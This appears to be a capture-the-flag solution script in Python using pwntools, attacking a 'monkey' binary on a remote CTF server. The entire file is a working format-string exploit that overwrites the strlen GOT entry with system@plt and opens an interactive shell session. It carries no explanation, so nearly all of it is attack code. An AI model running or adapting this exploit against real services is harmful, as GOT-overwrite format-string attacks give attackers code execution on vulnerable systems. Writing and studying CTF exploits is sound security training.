#!/usr/bin/env python

from pwn import *
import time

# r = process('./monkey')
r = remote('bamboofox.cs.nctu.edu.tw', 11000)

strlen_got = 0x804a034
system_plt = 0x80485c0

# raw_input('#')

def change(name):
    r.sendafter('choice!', '1\n')
    r.sendafter('characters', name + '\n')

def program(code):
    r.sendafter('choice!', '2\n')
    r.sendafter('out.', code + '\n')

fmt = p32(strlen_got + 2) + p32(strlen_got)
fmt += "%{}c%7$hn".format(0x0804 - 8)
fmt += "%{}c%8$hn".format(0x85c0 - 0x0804)

program(fmt)

r.interactive()
